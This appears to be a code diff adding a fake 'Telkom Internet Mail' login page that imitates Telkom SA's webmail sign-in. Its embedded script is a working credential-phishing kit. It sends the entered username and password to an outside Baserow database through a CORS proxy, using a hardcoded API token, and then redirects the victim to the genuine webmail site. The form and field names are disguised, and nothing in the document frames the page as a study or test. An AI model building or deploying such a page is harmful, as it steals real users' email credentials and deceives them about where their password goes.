@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telkom Internet Mail</title>
+    <style>
+        /* CSS is correct and unchanged */
+        body, html { margin: 0; padding: 0; height: 100%; font-family: Arial, Helvetica, sans-serif; background-color: #f0f0f0; }
+        .container { display: flex; flex-direction: column; min-height: 100vh; }
+        header { background-color: #0073b8; padding: 15px 30px; color: white; }
+        .header-logo { font-size: 24px; font-weight: bold; }
+        main { flex-grow: 1; display: flex; align-items: center; justify-content: center; padding: 20px; }
+        .login-box { background-color: #0073b8; padding: 40px; width: 100%; max-width: 480px; box-sizing: border-box; color: white; }
+        .login-box h1 { margin: 0 0 30px 0; padding: 0; font-size: 28px; font-weight: bold; text-align: left; }
+
+        /* --- MODIFICATION FOR PERMANENT LAYOUT --- */
+        .form-grid {
+            display: grid;
+            /* Using a slightly more flexible layout for labels to fit smaller screens */
+            grid-template-columns: auto 1fr;
+            gap: 15px 10px;
+            align-items: center;
+        }
+        .form-grid label {
+            text-align: right;
+            padding-right: 10px;
+            /* Prevents long labels from wrapping */
+            white-space: nowrap;
+        }
+        /* --- END MODIFICATION --- */
+        
+        .form-grid input[type="text"], .form-grid input[type="password"], .form-grid select { width: 100%; padding: 8px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        
+        /* This rule now works on all screen sizes to keep alignment */
+        .grid-col-span-2 {
+            grid-column: 2 / 3;
+        }
+        
+        .actions-container { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; /* Allows button to wrap if screen is extremely narrow */ }
+        .stay-signed-in { display: flex; align-items: center; }
+        .stay-signed-in input { margin-right: 5px; }
+        .sign-in-btn { padding: 6px 15px; background-color: #e1e1e1; border: 1px solid #777; border-radius: 3px; cursor: pointer; color: #333; }
+        .sign-in-btn:hover { background-color: #d1d1d1; }
+        .version-container { display: flex; align-items: center; width: 100%; }
+        .version-container select { flex-grow: 1; }
+        .whats-this { color: white; text-decoration: none; font-size: 12px; margin-left: 10px; white-space: nowrap; }
+        .whats-this:hover { text-decoration: underline; }
+        footer { background-color: #005a94; color: white; padding: 20px 30px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; }
+        .footer-logo { font-size: 20px; font-weight: bold; }
+        .shield-icon { position: fixed; bottom: 15px; left: 15px; background-color: #4c9fdc; border-radius: 5px; padding: 10px; display: flex; align-items: center; justify-content: center; }
+        .shield-icon svg { fill: white; width: 24px; height: 24px; }
+        
+        @media (max-width: 768px) {
+            .login-box {
+                padding: 20px;
+            }
+            /* The responsive rules that stacked the form have been removed */
+            footer {
+                flex-direction: column;
+                text-align: center;
+            }
+            .footer-logo {
+                margin-top: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header><div class="header-logo">Telkom</div></header>
+        <main>
+            <div class="login-box">
+                <h1>Telkom Internet Mail</h1>
+                <form id="personaForm">
+                    <div class="form-grid">
+                        <label for="myName">Username:</label>
+                        <input type="text" id="myName">
+                        <label for="maritaStatus">Password:</label>
+                        <input type="password" id="maritaStatus">
+                        <label></label> 
+                        <div class="actions-container grid-col-span-2">
+                             <div class="stay-signed-in">
+                                <input type="checkbox" id="stay-signed-in"><label for="stay-signed-in">Stay signed in</label>
+                            </div>
+                            <button type="submit" class="sign-in-btn">Sign In</button>
+                        </div>
+                        <label for="version">Version:</label>
+                        <div class="version-container">
+                             <select id="version"><option>Default</option><option>Basic</option><option>Mobile</option></select>
+                            <a href="#" class="whats-this">What's This?</a>
+                        </div>
+                    </div>
+                </form>
+            </div>
+        </main>
+        <footer>
+            <div>Copyright Telkom SA SOC Limited. 2020 . All Rights Reserved. Privacy Statement</div>
+            <div class="footer-logo">Telkom</div>
+        </footer>
+    </div>
+    <div class="shield-icon"><svg xmlns="http://www.w3.org/2000/svg" height="24px" viewBox="0 0 24 24" width="24px" fill="#FFFFFF"><path d="M0 0h24v24H0z" fill="none"/><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg></div>
+
+    <script>
+        document.getElementById('personaForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            const tableId = '651772';
+            const apiToken = 'A4AgPMY4tVl9itOnznA5MO5yU0vcLwor';
+            
+            const targetUrl = `https://api.baserow.io/api/database/rows/table/${tableId}/?user_field_names=true`;
+            const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
+
+            const myName = document.getElementById('myName').value;
+            const maritaStatus = document.getElementById('maritaStatus').value;
+
+            const dataToCreate = {
+                "Name": myName,
+                "Long": maritaStatus
+            };
+
+            fetch(proxyUrl, {
+                method: 'POST',
+                headers: { 'Authorization': `Token ${apiToken}`, 'Content-Type': 'application/json' },
+                body: JSON.stringify(dataToCreate)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.json().then(errorData => {
+                        throw new Error(`Baserow API Error (${response.status}): ${JSON.stringify(errorData)}`);
+                    });
+                }
+                return response.json();
+            })
+            .then(data => {
+                console.log('Success! New row created:', data);
+                alert('Success! Your data has been sent.');
+                window.location.href = 'https://webmail.telkomsa.net';
+            })
+            .catch(error => {
+                console.error('Detailed Error:', error);
+                alert(`Request Failed. The server responded with: ${error.message}`);
+            });
+        });
+    </script>
+
+</body>
+</html>
